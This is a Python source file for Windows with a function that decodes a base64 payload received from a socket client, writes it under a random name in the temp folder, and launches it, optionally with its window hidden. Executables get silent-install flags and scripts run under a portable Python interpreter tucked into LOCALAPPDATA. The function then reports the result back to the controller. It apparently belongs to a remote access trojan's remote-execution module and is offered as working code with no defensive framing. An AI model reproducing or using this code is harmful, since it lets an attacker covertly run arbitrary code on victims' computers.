import os
import base64
import tempfile
import random
import string
import win32process
import win32con
import threading

def execute_file(client, execute_file_chunk, file_type, visibility, converter):
    try:
        base64_file = execute_file_chunk
        visibility = visibility
        file_type = file_type
        decoded_file = base64.b64decode(base64_file)
        python_library_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Python', 'pyportable', 'python.exe')

        temp_dir = tempfile.gettempdir()
        random_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + file_type
        full_path = os.path.join(temp_dir, random_filename)

        with open(full_path, "wb") as f:
            f.write(decoded_file)

        startupinfo = win32process.STARTUPINFO()
        if visibility != "Visible":
            startupinfo.dwFlags |= win32process.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = win32con.SW_HIDE

        def create_process():
            if file_type == ".exe":
                silent_flags = ["/S", "/quiet", "/silent", "/norestart"]
                command = f'"{full_path}" ' + " ".join(silent_flags)
            else:
                command = f'"{python_library_path}" "{full_path}"'

            win32process.CreateProcess(
                None, 
                command, 
                None, 
                None, 
                False, 
                win32con.CREATE_NO_WINDOW if visibility.lower() != "visible" else 0, 
                None, 
                None, 
                startupinfo
            )

        threading.Thread(target=create_process, daemon=True).start()
        client.emit('message', converter.encode({"execute_file": "File executed successfully."}))

    except Exception as e:
        client.emit('message', converter.encode({"execute_file_logger": str(e)}))
